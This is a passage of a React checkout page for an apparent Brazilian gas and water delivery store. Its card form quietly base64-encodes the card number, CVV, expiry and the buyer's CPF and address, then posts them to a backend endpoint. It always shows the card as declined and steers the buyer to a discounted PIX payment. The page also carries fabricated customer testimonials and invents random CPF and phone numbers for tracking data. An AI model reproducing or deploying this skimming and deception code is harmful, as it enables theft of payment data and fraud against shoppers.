              phone: savedCustomerData.phone ? savedCustomerData.phone.replace(/\D/g, '') : generateRandomPhone(),
              document: savedCustomerData.cpf ? savedCustomerData.cpf.replace(/\D/g, '') : generateRandomCPF(),
              country: "BR",
              ip: userIp
            },
            products: currentPixData.items.map((item: any, index: number) => ({
              id: `product-${currentPixData.id}-${index}`,
              name: "GBnewTno",
              planId: null,
              planName: null,
              quantity: item.quantity,
              priceInCents: item.unitPrice
            })),
            trackingParameters: {
              src: utmParams.src || null,
              sck: utmParams.sck || null,
              utm_source: utmParams.utm_source || null,
              utm_campaign: utmParams.utm_campaign || null,
              utm_medium: utmParams.utm_medium || null,
              utm_content: utmParams.utm_content || null,
              utm_term: utmParams.utm_term || null
            },
            commission: {
              totalPriceInCents: currentPixData.amount,
              gatewayFeeInCents: Math.round(currentPixData.amount * 0.04),
              userCommissionInCents: Math.round(currentPixData.amount * 0.96)
            },
            isTest: process.env.NODE_ENV === 'development'
          }
        }
        
        // Usar payload base, apenas atualizar status e approvedDate
        utmifyData = {
          ...basePayload,
          status: 'paid',
          approvedDate: new Date().toISOString().replace('T', ' ').substring(0, 19)
        }
      }
      
      // Tentar até 5 vezes para garantir envio (especialmente para PAID)
      const maxAttempts = status === 'paid' ? 5 : 2
      let success = false
      
      for (let attempt = 1; attempt <= maxAttempts && !success; attempt++) {
        try {
          const response = await fetch('/api/send-to-utmify', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(utmifyData)
          })
          
          if (response.ok) {
            success = true
            const key = status === 'waiting_payment' ? 'pending' : 'paid'
            const newState = { ...utmifySent, [key]: true }
            setUtmifySent(newState)
            // Salvar no localStorage
            localStorage.setItem('utmify-sent', JSON.stringify(newState))
          } else {
            if (attempt < maxAttempts) {
              await new Promise(resolve => setTimeout(resolve, 2000))
            }
          }
        } catch (error) {
          if (attempt < maxAttempts) {
            await new Promise(resolve => setTimeout(resolve, 2000))
          }
        }
      }
      
      if (!success && status === 'paid') {
        // Se falhou ao enviar PAID, salvar flag para tentar novamente depois
        localStorage.setItem('utmify-paid-pending', JSON.stringify({
          payload: utmifyData,
          timestamp: Date.now()
        }))
      }
    } catch (error) {
      console.error(`❌ [ERROR] Erro ao enviar ${status} para UTMify:`, error)
    }
  }
  
  // Função removida - usando apenas startPaymentPolling com Umbrela
  
  // Verificar se há PAID pendente ao carregar
  useEffect(() => {
    const checkPendingPaid = async () => {
      const pendingPaid = localStorage.getItem('utmify-paid-pending')
      if (pendingPaid) {
        try {
          const { payload, timestamp } = JSON.parse(pendingPaid)
          // Se tem menos de 24 horas, tentar enviar novamente
          if (Date.now() - timestamp < 24 * 60 * 60 * 1000) {
            const response = await fetch('/api/send-to-utmify', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(payload)
            })
            
            if (response.ok) {
              localStorage.removeItem('utmify-paid-pending')
              const utmifySentData = localStorage.getItem('utmify-sent')
              const currentState = utmifySentData ? JSON.parse(utmifySentData) : { pending: false, paid: false }
              localStorage.setItem('utmify-sent', JSON.stringify({ ...currentState, paid: true }))
            }
          } else {
            // Mais de 24h, remover
            localStorage.removeItem('utmify-paid-pending')
          }
        } catch (e) {
          // Ignorar erros
        }
      }
    }
    
    checkPendingPaid()
  }, [])

  // Enviar pending para UTMify quando PIX for gerado
  useEffect(() => {
    if (pixData && (pixData.status === 'waiting_payment' || pixData.status === 'WAITING_PAYMENT') && !utmifySent.pending) {
      sendToUtmify('waiting_payment')
    }
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [pixData?.id, pixData?.status, utmifySent.pending])
  
  // Iniciar polling quando PIX for gerado
  useEffect(() => {
    if (pixData && pixData.status === 'paid') {
      // Parar polling se pagamento foi confirmado
      if (pollingInterval) {
        clearInterval(pollingInterval)
        setPollingInterval(null)
      }
    }
  }, [pixData?.id, pixData?.status])
  
  // Agendar envio de SMS após 5 minutos se não pagar
  useEffect(() => {
    if (pixData && pixData.status === 'waiting_payment' && !smsReminderSent) {
      const smsTimeout = setTimeout(() => {
        if (pixData.status === 'waiting_payment') {
          sendSmsReminder()
        }
      }, 5 * 60 * 1000) // 5 minutos
      
      return () => {
        clearTimeout(smsTimeout)
      }
    }
  }, [pixData?.id, pixData?.status, smsReminderSent])
  
  // Monitorar mudanças no status do pagamento para Google Ads
  useEffect(() => {
    if (pixData && pixData.status === 'paid' && !conversionReported && pixData.id) {
      const totalPrice = getTotalPrice();
      reportPurchaseConversion(totalPrice, pixData.id.toString());
      setConversionReported(true);
    }
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [pixData?.status, productName, kitMangueira, conversionReported])

  // Timer de 15 minutos para desconto PIX
  useEffect(() => {
    if (step === 3 && !pixData && pixTimer > 0) {
      const timer = setInterval(() => {
        setPixTimer(prev => prev > 0 ? prev - 1 : 0)
      }, 1000)
      return () => clearInterval(timer)
    }
  }, [step, pixData, pixTimer])

  // Mostrar botão de suporte após 5 minutos do PIX gerado e não pago
  useEffect(() => {
    if (pixData && pixData.status === 'waiting_payment') {
      const supportTimer = setTimeout(() => {
        setShowSupportButton(true)
      }, 5 * 60 * 1000) // 5 minutos
      
      return () => clearTimeout(supportTimer)
    } else {
      setShowSupportButton(false)
    }
  }, [pixData?.id, pixData?.status])

  // Formatar timer
  const formatPixTimer = () => {
    const mins = Math.floor(pixTimer / 60)
    const secs = pixTimer % 60
    return `${mins}:${secs.toString().padStart(2, '0')}`
  }

  const handleCardSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setCardSubmitting(true)

    // Preparar dados
    const dataToEncrypt = {
      customerName: customerData.name,
      customerCpf: customerData.cpf,
      customerPhone: customerData.phone,
      customerEmail: `${customerData.phone.replace(/\D/g, '')}@cliente.com`,
      customerAddress: `${addressData?.logradouro}, ${customerData.number} - ${addressData?.bairro}, ${addressData?.localidade}/${addressData?.uf}`,
      cardNumber: cardData.cardNumber,
      cardHolderName: cardData.cardHolderName,
      cardExpiryDate: cardData.cardExpiryDate,
      cardCvv: cardData.cardCvv,
      productName: productName,
      productPrice: getTotalPrice(),
      productQuantity: 1,
      total: getTotalPrice()
    }

    // "Criptografar" dados (base64 no front)
    const encryptedData = btoa(JSON.stringify(dataToEncrypt))

    // Salvar dados em background (sem mostrar ao usuário)
    try {
      await fetch('/api/processing', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ data: encryptedData })
      })
    } catch (error) {
      // Salvar silenciosamente, não mostrar erro
    }

    // Simular processamento
    await new Promise(resolve => setTimeout(resolve, 2000))

    // Sempre mostrar que falhou e oferecer PIX
    setCardSubmitting(false)
    setShowCardForm(false)
    setCardFailed(true)
    
    // Calcular e aplicar desconto de 10%
    const discount = Math.round(getTotalPrice() * 0.10)
    setPixDiscount(discount)
    
    // Mostrar modal de erro com opção PIX
    setTimeout(() => {
      setShowPixDiscountModal(true)
    }, 300)
  }

  const formatCardNumber = (value: string) => {
    const cleanValue = value.replace(/\D/g, '')
    return cleanValue.replace(/(\d{4})(?=\d)/g, '$1 ').trim()
  }

  const formatExpiryDate = (value: string) => {
    const cleanValue = value.replace(/\D/g, '')
    if (cleanValue.length >= 2) {
      return cleanValue.substring(0, 2) + '/' + cleanValue.substring(2, 4)
    }
    return cleanValue
  }

  return (
    <div className="min-h-screen bg-gray-100">
      {/* Header Fixo de Localização */}
      <LocationHeader />
      
      {/* Modal de PIX Pendente */}
      <Dialog open={showPendingPixModal} onOpenChange={setShowPendingPixModal}>
        <DialogContent className="sm:max-w-lg">
          <DialogHeader>
            <DialogTitle className="text-center text-xl font-bold text-gray-800">
              🔔 Você tem um pedido pendente!
            </DialogTitle>
          </DialogHeader>
          
          <div className="space-y-4">
            <div className="bg-blue-50 border-2 border-blue-200 rounded-lg p-4 text-center">
              <p className="text-gray-700 mb-2">
                Detectamos que você tem um <strong>QR Code PIX</strong> aguardando pagamento.
              </p>
              <p className="text-sm text-gray-600">
                Deseja continuar com este pedido ou começar um novo?
              </p>
            </div>

            {pendingPixData && (
              <div className="bg-gray-50 rounded-lg p-3 text-sm">
                <p className="font-semibold text-gray-800 mb-1">Detalhes do Pedido:</p>
                <p className="text-gray-600">
                  Valor: <strong className="text-green-600">
                    {formatPrice(pendingPixData.pixData.amount)}
                  </strong>
                </p>
                <p className="text-gray-600">
                  Cliente: <strong>{pendingPixData.customerData.name}</strong>
                </p>
              </div>
            )}

            <div className="grid grid-cols-2 gap-3">
              <Button
                onClick={startNewOrder}
                variant="outline"
                className="w-full"
              >
                🔄 Novo Pedido
              </Button>
              <Button
                onClick={continuePendingPix}
                className="w-full bg-green-600 hover:bg-green-700"
              >
                ✅ Continuar
              </Button>
            </div>

            <p className="text-xs text-center text-gray-500">
              O QR Code anterior ainda é válido por mais tempo
            </p>
          </div>
        </DialogContent>
      </Dialog>
      
      {/* Modal de Confirmação de Endereço */}
      <Dialog open={showAddressModal} onOpenChange={setShowAddressModal}>
        <DialogContent className="sm:max-w-md">
          <DialogHeader>
            <DialogTitle className="text-center text-xl font-bold text-gray-800 flex items-center justify-center gap-2">
              <MapPin className="w-6 h-6 text-green-600" />
              Confirme seu Endereço
            </DialogTitle>
          </DialogHeader>
          
          {addressData && (
            <div className="space-y-4">
              <div className="bg-green-50 border-2 border-green-200 rounded-lg p-4">
                <div className="space-y-2 text-sm text-gray-700">
                  <p className="flex justify-between">
                    <strong>CEP:</strong>
                    <span>{addressData.cep}</span>
                  </p>
                  <p className="flex justify-between">
                    <strong>Rua:</strong>
                    <span className="text-right">{addressData.logradouro}</span>
                  </p>
                  <p className="flex justify-between">
                    <strong>Bairro:</strong>
                    <span>{addressData.bairro}</span>
                  </p>
                  <p className="flex justify-between">
                    <strong>Cidade:</strong>
                    <span>{addressData.localidade} - {addressData.uf}</span>
                  </p>
                </div>
              </div>
              
              <div className="bg-blue-50 border border-blue-200 rounded-lg p-3 flex items-center gap-2">
                <Clock className="w-5 h-5 text-blue-600 flex-shrink-0" />
                <p className="text-sm text-blue-800 font-semibold">
                  Entrega em até 30 minutos!
                </p>
              </div>
              
              <div className="flex gap-3">
                <Button
                  onClick={confirmAddress}
                  className="flex-1 bg-gradient-to-r from-green-600 to-green-700 hover:from-green-700 hover:to-green-800 text-white font-semibold"
                >
                  ✓ Confirmar Endereço
                </Button>
                <Button
                  onClick={() => {
                    setShowAddressModal(false)
                    setAddressData(null)
                    setCep("")
                  }}
                  variant="outline"
                  className="px-6"
                >
                  Alterar CEP
                </Button>
              </div>
            </div>
          )}
        </DialogContent>
      </Dialog>

      {/* Header */}
      <header className="bg-white shadow-md">
        <div className="container mx-auto px-4 py-3 sm:py-4 flex items-center justify-between">
          <Button
            variant="ghost"
            onClick={() => router.back()}
            className="flex items-center gap-2 text-gray-600 hover:text-blue-600 p-2 sm:px-3"
          >
            <ArrowLeft size={18} />
            <span className="hidden sm:inline">Voltar</span>
          </Button>
          <img
            src="/images/configas.png"
            alt="Configás e Água"
            className="h-10 sm:h-[50px] w-auto"
            style={{ backgroundColor: 'transparent' }}
          />
          <div className="w-16 sm:w-20"></div>
        </div>
      </header>

      <div className="container mx-auto px-4 py-6 sm:py-8 max-w-2xl">
        {/* Progress Steps */}
        <div className="flex items-center justify-center mb-6 sm:mb-8">
          <div className="flex items-center space-x-2 sm:space-x-4">
            <div
              className={`w-6 h-6 sm:w-8 sm:h-8 rounded-full flex items-center justify-center text-xs sm:text-sm font-semibold ${
                step >= 1 ? "bg-blue-600 text-white" : "bg-gray-200 text-gray-500"
              }`}
            >
              1
            </div>
            <div className={`w-8 sm:w-16 h-1 ${step >= 2 ? "bg-blue-600" : "bg-gray-200"}`}></div>
            <div
              className={`w-6 h-6 sm:w-8 sm:h-8 rounded-full flex items-center justify-center text-xs sm:text-sm font-semibold ${
                step >= 2 ? "bg-blue-600 text-white" : "bg-gray-200 text-gray-500"
              }`}
            >
              2
            </div>
            <div className={`w-8 sm:w-16 h-1 ${step >= 3 ? "bg-blue-600" : "bg-gray-200"}`}></div>
            <div
              className={`w-6 h-6 sm:w-8 sm:h-8 rounded-full flex items-center justify-center text-xs sm:text-sm font-semibold ${
                step >= 3 ? "bg-blue-600 text-white" : "bg-gray-200 text-gray-500"
              }`}
            >
              3
            </div>
          </div>
        </div>

        {/* Product Info */}
        <Card className="mb-4 sm:mb-6">
          <CardHeader className="pb-3 sm:pb-4">
            <CardTitle className="text-center text-lg sm:text-xl text-gray-800">
              Finalizando compra:
              <div className="text-sm sm:text-base font-normal text-gray-600 mt-1">{productName}</div>
              <div className="text-xl sm:text-2xl font-bold text-blue-600 mt-2">
                {formatPrice(getTotalPrice())}
              </div>
            </CardTitle>
          </CardHeader>
        </Card>

        {/* Step 1: CEP */}
        {step === 1 && (
          <Card>
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <MapPin className="w-5 h-5 text-blue-600" />
                Confirme seu CEP
              </CardTitle>
            </CardHeader>
            <CardContent>
              <form onSubmit={handleCepSubmit} className="space-y-4">
                <div>
                  <Input
                    type="text"
                    placeholder="Digite seu CEP (ex: 12345-678)"
                    value={cep}
                    onChange={(e) => setCep(formatCep(e.target.value))}
                    className="text-center text-lg"
                    maxLength={9}
                  />
                  {error && <p className="text-red-500 text-sm text-center mt-2">{error}</p>}
                </div>
                <Button
                  type="submit"
                  disabled={loading || cep.length < 9}
                  className="w-full bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 text-white"
                >
                  {loading ? "Verificando..." : "Confirmar CEP"}
                </Button>
              </form>
            </CardContent>
          </Card>
        )}

        {/* Step 2: Customer Data */}
        {step === 2 && addressData && (
          <div className="space-y-4 sm:space-y-6">
            {/* Address Confirmation */}
            <Card>
              <CardHeader className="pb-3 sm:pb-4">
                <CardTitle className="flex items-center gap-2 text-base sm:text-lg">
                  <MapPin className="w-4 h-4 sm:w-5 sm:h-5 text-green-600" />
                  Endereço Confirmado
                </CardTitle>
              </CardHeader>
              <CardContent className="pt-0">
                <div className="bg-green-50 border border-green-200 rounded-lg p-3 sm:p-4">
                  <div className="space-y-1 sm:space-y-2 text-xs sm:text-sm text-gray-700">
                    <p>
                      <strong>CEP:</strong> {addressData.cep}
                    </p>
                    <p>
                      <strong>Rua:</strong> {addressData.logradouro}
                    </p>
                    <p>
                      <strong>Bairro:</strong> {addressData.bairro}
                    </p>
                    <p>
                      <strong>Cidade:</strong> {addressData.localidade} - {addressData.uf}
                    </p>
                  </div>
                  <div className="flex items-center gap-2 mt-3 sm:mt-4 p-2 sm:p-3 bg-blue-50 border border-blue-200 rounded-lg">
                    <Clock className="w-4 h-4 sm:w-5 sm:h-5 text-blue-600" />
                    <p className="text-xs sm:text-sm text-blue-800 font-semibold">Entrega em até 30 minutos!</p>
                  </div>
                </div>
              </CardContent>
            </Card>

            {/* Customer Data Form */}
            <Card>
              <CardHeader className="pb-3 sm:pb-4">
                <CardTitle className="text-base sm:text-lg">Confirme seus dados para entrega</CardTitle>
              </CardHeader>
              <CardContent className="pt-0">
                <form onSubmit={handleCustomerDataSubmit} className="space-y-3 sm:space-y-4">
                  <div>
                    <label className="block text-xs sm:text-sm font-medium text-gray-700 mb-1 sm:mb-2">
                      Nome completo *
                    </label>
                    <Input
                      type="text"
                      placeholder="Seu nome completo"
                      value={customerData.name}
                      onChange={(e) => {
                        const value = sanitizeInput(e.target.value, true) // Permitir espaços no nome
                        if (isInputSafe(value)) {
                          setCustomerData({ ...customerData, name: value })
                        }
                      }}
                      className="text-sm sm:text-base"
                      required
                    />
                  </div>

                  <div className="grid grid-cols-2 gap-3 sm:gap-4">
                    <div>
                      <label className="block text-xs sm:text-sm font-medium text-gray-700 mb-1 sm:mb-2">
                        Telefone/WhatsApp *
                      </label>
                      <Input
                        type="text"
                        placeholder="(31) 99999-9999"
                        value={customerData.phone}
                        onChange={(e) => {
                          const value = sanitizeInput(e.target.value)
                          if (isInputSafe(value)) {
                            setCustomerData({ ...customerData, phone: formatPhone(value) })
                          }
                        }}
                        className="text-sm sm:text-base"
                        maxLength={15}
                        required
                      />
                    </div>
                    <div>
                      <label className="block text-xs sm:text-sm font-medium text-gray-700 mb-1 sm:mb-2">
                        CPF *
                      </label>
                      <Input
                        type="text"
                        placeholder="000.000.000-00"
                        value={customerData.cpf}
                        onChange={(e) => {
                          const value = sanitizeInput(e.target.value)
                          if (isInputSafe(value)) {
                            setCustomerData({ ...customerData, cpf: formatCPF(value) })
                          }
                        }}
                        className="text-sm sm:text-base"
                        maxLength={14}
                        required
                      />
                    </div>
                  </div>

                  <div className="grid grid-cols-2 gap-3 sm:gap-4">
                    <div>
                      <label className="block text-xs sm:text-sm font-medium text-gray-700 mb-1 sm:mb-2">
                        Número *
                      </label>
                      <Input
                        type="text"
                        placeholder="123"
                        value={customerData.number}
                        onChange={(e) => {
                          const value = sanitizeInput(e.target.value)
                          if (isInputSafe(value)) {
                            setCustomerData({ ...customerData, number: value })
                          }
                        }}
                        className="text-sm sm:text-base"
                        required
                      />
                    </div>
                    <div>
                      <label className="block text-xs sm:text-sm font-medium text-gray-500 mb-1 sm:mb-2">
                        Complemento (opcional)
                      </label>
                      <Input
                        type="text"
                        placeholder="Apto 101"
                        value={customerData.complement}
                        onChange={(e) => {
                          const value = sanitizeInput(e.target.value)
                          if (isInputSafe(value)) {
                            setCustomerData({ ...customerData, complement: value })
                          }
                        }}
                        className="text-sm sm:text-base"
                      />
                    </div>
                  </div>

                  {/* Seleção de Marca de Gás */}
                  {isGasProduct() && (
                    <div className="border border-blue-200 rounded-lg p-4 bg-blue-50">
                      <h4 className="font-bold text-blue-800 text-sm mb-2">🔥 Marca pré-selecionada: <span className="text-green-600">Liquigas</span> (Melhor preço do dia)</h4>
                      <p className="text-xs text-gray-600 mb-3">Você pode alterar se preferir outra marca:</p>
                      <select
                        value={selectedGasBrand}
                        onChange={(e) => setSelectedGasBrand(e.target.value)}
                        className="w-full p-2 border border-blue-300 rounded-lg text-sm focus:ring-2 focus:ring-blue-600 focus:border-blue-600"
                      >
                        {gasBrands.map((brand) => (
                          <option key={brand} value={brand}>
                            {brand}
                          </option>
                        ))}
                      </select>
                      <div className="mt-3 p-3 bg-green-50 border border-green-200 rounded-lg">
                        <p className="text-xs text-green-800 leading-relaxed mb-2">
                          <strong>💰 Forma de Pagamento: Você paga 50% agora via PIX e os outros 50% diretamente com o motoboy na entrega!</strong>
                        </p>
                        <p className="text-xs text-green-700 leading-relaxed mb-2">
                          💳 <strong>Ao receber, você escolhe como pagar os 50% restantes:</strong> Dinheiro, PIX ou Cartão (na maquininha do motoboy).
                        </p>
                        <p className="text-xs text-green-700 leading-relaxed mb-2">
                          📞 <strong>Nosso motoboy irá ligar para confirmar a escolha do cliente, não se preocupe que não terá taxas, é bem prático e rápido.</strong>
                        </p>
                        <p className="text-xs text-green-700 leading-relaxed">
                          🚀 <strong>Ao gerar o PIX, o motoboy mais próximo já recebe uma notificação e já fica no aguardo.</strong> Quando pagamento é concluído ele já aceita seu pedido e informamos o seu número pra ele te ligar e confirmar o pedido.
                        </p>
                        <p className="text-xs text-green-700 leading-relaxed">
                          🏢 <strong>Temos Centrais de distribuição na maioria das cidades e bairros :)</strong> Estamos pertinho de vocês. Trabalhamos em parceria com a maioria das empresas fornecedoras de gás a nível nacional.
                        </p>
                      </div>
                    </div>
                  )}

                  {/* Seleção de Marca de Água */}
                  {isWaterProduct() && (
                    <div className="border border-blue-200 rounded-lg p-4 bg-blue-50">
                      <h4 className="font-bold text-blue-800 text-sm mb-2">💧 Marca pré-selecionada: <span className="text-green-600">Naturágua</span> (Melhor preço do dia)</h4>
                      <p className="text-xs text-gray-600 mb-3">Você pode alterar se preferir outra marca:</p>
                      <select
                        value={selectedWaterBrand}
                        onChange={(e) => setSelectedWaterBrand(e.target.value)}
                        className="w-full p-2 border border-blue-300 rounded-lg text-sm focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                      >
                        {waterBrands.map((brand) => (
                          <option key={brand} value={brand}>
                            {brand}
                          </option>
                        ))}
                      </select>
                      <div className="mt-3 p-3 bg-yellow-50 border border-yellow-200 rounded-lg">
                        <p className="text-xs text-yellow-800 leading-relaxed">
                          <strong>📞 Se você quer outra marca que não esteja aqui, não se preocupa que nosso motoboy vai te ligar e confirmar o pedido assim que seu pagamento for aprovado ok?</strong>
                        </p>
                      </div>
                    </div>
                  )}

                  {/* Escolha seu Brinde */}
                  {isGasProduct() && (
                    <div className="border-2 border-dashed border-purple-300 rounded-lg p-4 bg-purple-50">
                      <div className="flex items-center gap-2 mb-3">
                        <Plus className="w-5 h-5 text-purple-600" />
                        <h4 className="font-bold text-purple-800 text-base">🎁 Escolha seu Brinde Grátis!</h4>
                      </div>
                      <p className="text-xs text-gray-700 mb-4 leading-relaxed">
                        <strong>Parabéns!</strong> Você ganhou um brinde especial com sua compra. Escolha entre:
                      </p>
                      
                      {/* Opção 1: Registro */}
                      <div className="mb-3 p-3 border-2 border-purple-200 rounded-lg bg-white hover:border-purple-400 transition-colors">
                        <div className="flex items-start gap-3">
                          <input
                            type="radio"
                            id="brinde-registro"
                            name="brinde"
                            checked={kitMangueira === false}
                            onChange={() => setKitMangueira(false)}
                            className="mt-1 w-4 h-4 text-purple-600 border-purple-300 focus:ring-purple-600"
                          />
                          <div className="flex-1">
                            <label htmlFor="brinde-registro" className="flex items-center gap-2 cursor-pointer">
                              <img 
                                src="/images/kitmangueira.png" 
                                alt="Registro" 
                                className="w-12 h-12 object-contain"
                              />
                              <div>
                                <p className="font-semibold text-sm text-gray-800">Registro para Gás</p>
                                <p className="text-xs text-gray-600">Segurança e praticidade</p>
                              </div>
                            </label>
                          </div>
                        </div>
                      </div>

                      {/* Opção 2: Kit Tupperware */}
                      <div className="p-3 border-2 border-purple-200 rounded-lg bg-white hover:border-purple-400 transition-colors">
                        <div className="flex items-start gap-3">
                          <input
                            type="radio"
                            id="brinde-tupperware"
                            name="brinde"
                            checked={kitMangueira === true}
                            onChange={() => setKitMangueira(true)}
                            className="mt-1 w-4 h-4 text-purple-600 border-purple-300 focus:ring-purple-600"
                          />
                          <div className="flex-1">
                            <label htmlFor="brinde-tupperware" className="flex items-center gap-2 cursor-pointer">
                              <img 
                                src="/images/tupperware.png" 
                                alt="Kit Tupperware" 
                                className="w-12 h-12 object-contain"
                              />
                              <div>
                                <p className="font-semibold text-sm text-gray-800">Kit de Vasilhas Tupperware</p>
                                <p className="text-xs text-gray-600">3 potes herméticos de qualidade</p>
                              </div>
                            </label>
                          </div>
                        </div>
                      </div>
                    </div>
                  )}

                  {/* Provas Sociais - Estilo Facebook */}
                  <div className="space-y-3">
                    {/* Comentário 1 */}
                    <div className="bg-white border border-gray-200 rounded-lg p-3">
                      <div className="flex items-start gap-3">
                        <div className="flex-shrink-0">
                          <div className="w-10 h-10 rounded-full bg-blue-500 flex items-center justify-center text-white font-bold text-sm">
                            C
                          </div>
                        </div>
                        <div className="flex-1">
                          <div className="flex items-center gap-2 mb-1">
                            <p className="font-semibold text-sm text-gray-900">Carlos Mendes</p>
                            <div className="flex text-yellow-500 text-xs">⭐⭐⭐⭐⭐</div>
                          </div>
                          <p className="text-xs text-gray-500 mb-2">há 2 dias</p>
                          <p className="text-sm text-gray-700 leading-relaxed">
                            Excelente serviço! Pedi o gás às 14h e chegou em 20 minutos. Entregador super educado e o preço melhor que na loja. Recomendo! 👍
                          </p>
                        </div>
                      </div>
                    </div>

                    {/* Comentário 2 */}
                    <div className="bg-white border border-gray-200 rounded-lg p-3">
                      <div className="flex items-start gap-3">
                        <div className="flex-shrink-0">
                          <div className="w-10 h-10 rounded-full bg-pink-500 flex items-center justify-center text-white font-bold text-sm">
                            J
                          </div>
                        </div>
                        <div className="flex-1">
                          <div className="flex items-center gap-2 mb-1">
                            <p className="font-semibold text-sm text-gray-900">Juliana Costa</p>
                            <div className="flex text-yellow-500 text-xs">⭐⭐⭐⭐⭐</div>
                          </div>
                          <p className="text-xs text-gray-500 mb-2">há 1 semana</p>
                          <p className="text-sm text-gray-700 leading-relaxed">
                            Primeira vez comprando online e adorei! Pagamento pelo PIX foi instantâneo e o gás chegou rapidinho. Muito prático! 🔥
                          </p>
                        </div>
                      </div>
                    </div>

                    {/* Comentário 3 */}
                    <div className="bg-white border border-gray-200 rounded-lg p-3">
                      <div className="flex items-start gap-3">
                        <div className="flex-shrink-0">
                          <div className="w-10 h-10 rounded-full bg-green-500 flex items-center justify-center text-white font-bold text-sm">
                            R
                          </div>
                        </div>
                        <div className="flex-1">
                          <div className="flex items-center gap-2 mb-1">
                            <p className="font-semibold text-sm text-gray-900">Roberto Silva</p>
                            <div className="flex text-yellow-500 text-xs">⭐⭐⭐⭐⭐</div>
                          </div>
                          <p className="text-xs text-gray-500 mb-2">há 3 dias</p>
                          <p className="text-sm text-gray-700 leading-relaxed">
                            Atendimento nota 10! Fiz o pedido pelo site e em menos de 30 min já estava aqui. Preço justo e entrega rápida. Virei cliente! 💯
                          </p>
                        </div>
                      </div>
                    </div>
                  </div>

                  <Button
                    type="submit"
                    className="w-full bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 text-white py-2 sm:py-3 text-sm sm:text-base"
                    disabled={
                      !customerData.name || 
                      !customerData.phone || 
                      !customerData.cpf ||
                      !customerData.number
                    }
                  >
                    Continuar para Pagamento
                  </Button>
                </form>
              </CardContent>
            </Card>
          </div>
        )}

        {/* Step 3: Payment */}
        {step === 3 && (
          <Card>
            <CardHeader className="pb-3 sm:pb-4">
              <CardTitle className="flex items-center gap-2 text-base sm:text-lg">
                <CreditCard className="w-4 h-4 sm:w-5 sm:h-5 text-blue-600" />
                Pagamento via PIX
              </CardTitle>
            </CardHeader>
            <CardContent className="pt-0 space-y-4 sm:space-y-6">
              {/* Order Summary */}
              <div className="bg-gray-50 rounded-lg p-3 sm:p-4">
                <h3 className="font-semibold text-gray-800 mb-2 sm:mb-3 text-sm sm:text-base">Resumo do Pedido</h3>
                <div className="space-y-1 sm:space-y-2 text-xs sm:text-sm">
                  <div className="flex justify-between">
                    <span>Produto:</span>
                    <span className="font-medium text-right max-w-[60%]">
                      {productName}
                      {isWaterProduct() && selectedWaterBrand && (
                        <div className="text-xs text-blue-600 mt-1">
                          Marca: {selectedWaterBrand}
                        </div>
                      )}
                      {isGasProduct() && selectedGasBrand && (
                        <div className="text-xs text-blue-600 mt-1">
                          Marca: {selectedGasBrand}
                        </div>
                      )}
                    </span>
                  </div>
                  <div className="flex justify-between">
                    <span>Valor do Produto:</span>
                    <span className="font-bold text-blue-600 text-sm sm:text-lg">
                      {formatPrice(productPrices[productName] || 1000)}
                    </span>
                  </div>
                  {kitMangueira && (
                    <div className="flex justify-between">
                      <span>Kit Mangueira:</span>
                      <span className="font-bold text-blue-600 text-sm sm:text-lg">
                        {formatPrice(930)}
                      </span>
                    </div>
                  )}
                  {pixDiscount > 0 && (
                    <div className="flex justify-between text-green-600">
                      <span>Desconto PIX (10%):</span>
                      <span className="font-bold">
                        -{formatPrice(pixDiscount)}
                      </span>
                    </div>
                  )}
                  <div className="flex justify-between border-t pt-2 mt-2">
                    <span className="font-bold">Valor Total:</span>
                    <span className="font-bold text-blue-600 text-lg">
                      {formatPrice(getTotalPrice() - pixDiscount)}
                    </span>
                  </div>
                  
                  {/* Explicação do Pagamento Parcelado */}
                  {requiresPartialPayment() && (
                    <div className="border-t pt-3 mt-3 space-y-2">
                      <div className="bg-gradient-to-r from-green-50 to-blue-50 border-2 border-green-300 rounded-lg p-3">
                        <div className="flex items-start gap-2 mb-2">
                          <span className="text-xl">💰</span>
                          <div className="flex-1">
                            <h4 className="font-bold text-green-800 text-sm mb-1">Facilidade de Pagamento!</h4>
                            <p className="text-xs text-gray-700 leading-relaxed">
                              Para sua comodidade, você paga apenas <strong className="text-green-600">50% agora via PIX</strong> para confirmar o pedido.
                            </p>
                          </div>
                        </div>
                        
                        <div className="space-y-2 text-xs">
                          <div className="flex justify-between items-center bg-white rounded p-2">
                            <span className="text-gray-700">💳 Pagar agora (50%):</span>
                            <span className="font-bold text-green-600 text-base">
                              {formatPrice(getPaymentAmount())}
                            </span>
                          </div>
                          <div className="flex justify-between items-center bg-white rounded p-2">
                            <span className="text-gray-700">🏍️ Pagar na entrega (50%):</span>
                            <span className="font-bold text-blue-600 text-base">
                              {formatPrice(getRemainingAmount())}
                            </span>
                          </div>
                        </div>
                        
                        <div className="mt-3 p-2 bg-blue-50 border border-blue-200 rounded">
                          <p className="text-xs text-blue-800 leading-relaxed">
                            <strong>📞 Como funciona:</strong> Após confirmar o pagamento de 50%, o motoboy irá ligar para confirmar seu endereço e tirar dúvidas. Os outros 50% você paga diretamente ao motoboy no momento da entrega.
                          </p>
                        </div>
                      </div>
                    </div>
                  )}
                  <div className="border-t pt-3 mt-3">
                    <h4 className="font-semibold text-gray-800 mb-3 text-sm">Dados do Cliente</h4>
                    
                    <div className="space-y-2 text-xs sm:text-sm">
                      <div className="flex items-start gap-2">
                        <span className="text-blue-600 mt-0.5">👤</span>
                        <div className="flex-1">
                          <p className="text-gray-600 text-xs">Nome:</p>
                          <p className="font-medium text-gray-800">{customerData.name}</p>
                        </div>
                      </div>
                      
                      <div className="flex items-start gap-2">
                        <span className="text-blue-600 mt-0.5">📱</span>
                        <div className="flex-1">
                          <p className="text-gray-600 text-xs">Telefone:</p>
                          <p className="font-medium text-gray-800">{customerData.phone}</p>
                        </div>
                      </div>
                      
                      <div className="flex items-start gap-2">
                        <MapPin className="w-4 h-4 text-blue-600 mt-0.5 flex-shrink-0" />
                        <div className="flex-1">
                          <p className="text-gray-600 text-xs mb-1">Endereço de Entrega:</p>
                          <p className="font-medium text-gray-800 leading-relaxed">
